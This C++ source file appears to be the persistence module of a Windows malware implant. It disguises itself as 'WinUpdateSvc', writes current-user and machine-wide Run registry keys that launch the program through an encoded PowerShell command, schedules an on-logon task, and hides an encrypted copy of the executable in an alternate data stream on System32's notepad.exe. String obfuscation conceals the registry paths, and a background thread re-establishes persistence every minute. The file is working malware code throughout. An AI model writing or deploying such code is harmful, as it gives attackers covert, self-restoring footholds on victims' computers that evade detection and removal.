#include "PersistenceModule.h"
#include "Globals.h"
#ifdef _WIN32
#include "Obfuscation.h"
#include <windows.h>
#include <string>
#include <fstream>
#include <vector>
#include <openssl/evp.h>
#endif
#include <chrono>
#include <thread>
#include <iostream>

#ifdef _WIN32
static const char* RUN_VALUE = OBFUSCATE("WinUpdateSvc");
static const char* TASK_NAME = OBFUSCATE("WinUpdateSvc");
static const std::string ADS_KEY = OBFUSCATE("07A1D56EF407A1D56EF407A1D56EF407");
static const std::string ADS_IV  = OBFUSCATE("DDAADD1122334455");

std::string PersistenceModule::executable_path() const {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    return std::string(path);
}

std::string PersistenceModule::encode_ps(const std::string& path) const {
    std::wstring wcmd = L"Start-Process '" + std::wstring(path.begin(), path.end()) + L"'";
    std::vector<unsigned char> bytes(wcmd.size()*2);
    memcpy(bytes.data(), wcmd.c_str(), bytes.size());
    int out_len = 4 * ((bytes.size() + 2) / 3);
    std::vector<unsigned char> out(out_len + 1);
    EVP_EncodeBlock(out.data(), bytes.data(), bytes.size());
    return std::string((char*)out.data(), out_len);
}

void PersistenceModule::set_run_key_hkcu(const std::string& cmd) {
    HKEY key;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
            OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0,
            KEY_WRITE, &key) == ERROR_SUCCESS) {
        RegSetValueExA(key, RUN_VALUE, 0, REG_SZ,
                       (const BYTE*)cmd.c_str(), cmd.size()+1);
        RegCloseKey(key);
    }
}

void PersistenceModule::set_run_key_hklm(const std::string& cmd) {
    HKEY key;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0,
            KEY_WRITE, &key) == ERROR_SUCCESS) {
        RegSetValueExA(key, RUN_VALUE, 0, REG_SZ,
                       (const BYTE*)cmd.c_str(), cmd.size()+1);
        RegCloseKey(key);
    }
}

bool PersistenceModule::check_run_key_hkcu() const {
    HKEY key;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
            OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0,
            KEY_READ, &key) != ERROR_SUCCESS) {
        return false;
    }
    char buf[512];
    DWORD len = sizeof(buf);
    LONG ret = RegQueryValueExA(key, RUN_VALUE, NULL, NULL, (LPBYTE)buf, &len);
    RegCloseKey(key);
    return ret == ERROR_SUCCESS;
}

bool PersistenceModule::check_run_key_hklm() const {
    HKEY key;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0,
            KEY_READ, &key) != ERROR_SUCCESS) {
        return false;
    }
    char buf[512];
    DWORD len = sizeof(buf);
    LONG ret = RegQueryValueExA(key, RUN_VALUE, NULL, NULL, (LPBYTE)buf, &len);
    RegCloseKey(key);
    return ret == ERROR_SUCCESS;
}

void PersistenceModule::set_task(const std::string& cmd) {
    std::string full = "schtasks /Create /SC ONLOGON /DELAY 0000:30 /TN " + std::string(TASK_NAME) + " /TR \"" + cmd + "\" /F";
    system(full.c_str());
}

bool PersistenceModule::check_task() const {
    std::string q = "schtasks /Query /TN " + std::string(TASK_NAME) + " >nul 2>&1";
    int ret = system(q.c_str());
    return ret == 0;
}

std::string PersistenceModule::ads_path() const {
    char win[MAX_PATH];
    GetEnvironmentVariableA(OBFUSCATE("WINDIR"), win, MAX_PATH);
    return std::string(win) + OBFUSCATE("\\System32\\notepad.exe:winlog.dat");
}

bool PersistenceModule::ads_exists() const {
    std::ifstream f(ads_path(), std::ios::binary);
    return f.good();
}

void PersistenceModule::write_ads_payload(const std::string& path) {
    std::ifstream in(path, std::ios::binary);
    if(!in.is_open()) return;
    std::vector<unsigned char> data((std::istreambuf_iterator<char>(in)), {});
    in.close();
    auto enc = Crypto::encrypt(data, ADS_KEY, ADS_IV);
    std::ofstream out(ads_path(), std::ios::binary);
    if(out.is_open()) {
        out.write((char*)enc.data(), enc.size());
        out.close();
    }
}

static void remove_run_key() {
    HKEY key;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
            OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0,
            KEY_WRITE, &key) == ERROR_SUCCESS) {
        RegDeleteValueA(key, RUN_VALUE);
        RegCloseKey(key);
    }
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0,
            KEY_WRITE, &key) == ERROR_SUCCESS) {
        RegDeleteValueA(key, RUN_VALUE);
        RegCloseKey(key);
    }
}

static void remove_task() {
    std::string cmd = "schtasks /Delete /TN " + std::string(TASK_NAME) + " /F >nul 2>&1";
    system(cmd.c_str());
}

static void remove_ads(const std::string& p) {
    DeleteFileA(p.c_str());
}
#endif

void PersistenceModule::ensure_persistence() {
#ifdef _WIN32
    std::string path = executable_path();
    std::string ps = encode_ps(path);
#if PERSIST_RUN_HKCU
    if (!check_run_key_hkcu()) {
        set_run_key_hkcu(std::string("powershell -EncodedCommand ") + ps);
    }
#endif
#if PERSIST_RUN_HKLM
    if (!check_run_key_hklm()) {
        set_run_key_hklm(std::string("powershell -EncodedCommand ") + ps);
    }
#endif
#if PERSIST_TASK
    if (!check_task()) {
        set_task(path);
    }
#endif
#if PERSIST_ADS
    if (!ads_exists()) {
        write_ads_payload(path);
    }
#endif
#if PERSIST_WMI
    setup_wmi_subscription();
#endif
#else
    // non-Windows: no-op
#endif
}

void PersistenceModule::init() {
    ensure_persistence();
    monitor_ = std::thread([this]() {
        while (!g_safe_mode.load() && !g_deep_sleep.load()) {
            std::this_thread::sleep_for(std::chrono::minutes(1));
            ensure_persistence();
        }
    });
    monitor_.detach();
}

extern "C" Module* create_module() { return new PersistenceModule(); }

void remove_persistence() {
#ifdef _WIN32
    remove_run_key();
    remove_task();
    remove_ads(PersistenceModule().ads_path());
#endif
}

#ifdef _WIN32
void PersistenceModule::setup_wmi_subscription() {
    // placeholder for future WMI event subscription
}
#endif
